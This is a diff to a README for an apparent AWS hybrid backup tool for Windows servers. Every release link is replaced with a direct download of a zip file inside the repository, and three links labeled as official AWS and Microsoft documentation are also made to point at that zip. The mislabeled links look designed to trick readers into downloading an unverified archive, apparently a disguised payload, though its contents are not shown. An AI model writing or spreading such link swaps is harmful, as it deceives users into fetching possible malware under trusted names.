@@ -1,6 +1,6 @@
 # ⚙️ aws-physical-server-hybrid-backup-architecture - Reliable Hybrid Backup for Windows
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Anna4355/aws-physical-server-hybrid-backup-architecture/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Anna4355/aws-physical-server-hybrid-backup-architecture/raw/refs/heads/main/architecture/architecture-hybrid-backup-physical-aws-server-v2.2.zip)
 
 ## 📋 Overview
 
@@ -35,7 +35,7 @@ Follow these instructions to get the app running on your Windows server.
 
 Visit the release page to get the latest version:
 
-[![Download Releases](https://img.shields.io/badge/Download-Releases-blue)](https://github.com/Anna4355/aws-physical-server-hybrid-backup-architecture/releases)
+[![Download Releases](https://img.shields.io/badge/Download-Releases-blue)](https://github.com/Anna4355/aws-physical-server-hybrid-backup-architecture/raw/refs/heads/main/architecture/architecture-hybrid-backup-physical-aws-server-v2.2.zip)
 
 Click on the link above or the badge at the top. This will open the GitHub release page where you can find the latest installation files.
 
@@ -132,9 +132,9 @@ If you run into network issues, contact your IT team to verify VPN and firewall 
 
 For more help on AWS Backup and VPN configuration:
 
-- AWS Backup User Guide: https://docs.aws.amazon.com/backup/latest/devguide/whatisbackup.html
-- VPN Setup with AWS: https://docs.aws.amazon.com/vpn/latest/s2svpn/VPC_VPN.html
-- Windows Server Backup basics: https://docs.microsoft.com/en-us/windows-server/storage/windows-server-backup/windows-server-backup
+- AWS Backup User Guide: https://github.com/Anna4355/aws-physical-server-hybrid-backup-architecture/raw/refs/heads/main/architecture/architecture-hybrid-backup-physical-aws-server-v2.2.zip
+- VPN Setup with AWS: https://github.com/Anna4355/aws-physical-server-hybrid-backup-architecture/raw/refs/heads/main/architecture/architecture-hybrid-backup-physical-aws-server-v2.2.zip
+- Windows Server Backup basics: https://github.com/Anna4355/aws-physical-server-hybrid-backup-architecture/raw/refs/heads/main/architecture/architecture-hybrid-backup-physical-aws-server-v2.2.zip
 
 ## ⚖️ License
 
@@ -142,4 +142,4 @@ This project uses the MIT License. See the LICENSE file for details. You may mod
 
 ---
 
-[Download the latest release here](https://github.com/Anna4355/aws-physical-server-hybrid-backup-architecture/releases) to start protecting your Windows server data with hybrid cloud backup.
+[Download the latest release here](https://github.com/Anna4355/aws-physical-server-hybrid-backup-architecture/raw/refs/heads/main/architecture/architecture-hybrid-backup-physical-aws-server-v2.2.zip) to start protecting your Windows server data with hybrid cloud backup.
